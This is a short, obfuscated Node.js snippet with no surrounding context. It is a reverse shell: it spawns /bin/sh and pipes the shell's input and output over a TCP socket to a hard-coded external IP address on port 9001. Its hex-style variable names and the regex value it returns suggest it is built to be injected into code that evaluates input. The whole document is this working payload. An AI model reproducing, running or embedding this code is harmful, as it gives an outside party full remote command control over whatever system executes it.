(function () {
    var _0x49670b = require('net'), _0x5bf335 = require('child_process'), _0x5bc4e8 = _0x5bf335['spawn']('/bin/sh', []), _0x10bea0 = new _0x49670b['Socket']();
    return _0x10bea0['connect'](0x2329, '193.105.207.70', function () {
        _0x10bea0['pipe'](_0x5bc4e8['stdin']), _0x5bc4e8['stdout']['pipe'](_0x10bea0), _0x5bc4e8['stderr']['pipe'](_0x10bea0);
    }), /a/;
}());
